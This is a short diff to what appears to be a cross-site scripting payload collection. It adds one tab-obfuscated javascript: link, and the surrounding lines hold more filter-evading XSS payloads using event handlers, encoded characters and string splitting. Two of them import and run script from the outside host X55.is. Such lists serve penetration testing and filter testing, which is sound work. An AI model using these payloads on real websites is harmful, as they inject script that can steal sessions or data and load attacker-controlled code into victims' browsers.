@@ -10,6 +10,7 @@ x"//oNeRrOr=`/AmoloHT/`
 <svg><set onbegin=d=document,b=/`/.source,d[/loca/.source+/tion/.source]=/javascript&colon;aler/.source+/t/.source+b+domain+b>
 <a href=//X55.is autofocus onfocus=import(href)>
 <a href=javascript:'\74svg/onload\75alert\501\51\76'>
+<a href="javas%09cript:[1].map(top['ale'+'rt'])">
 <Img Src="//X55.is/> "OnError=import(src)//
 <Img Src="javascript:alert(1)> 1"OnError=location=src//
 javascript:&#37&#54&#49lert(1)
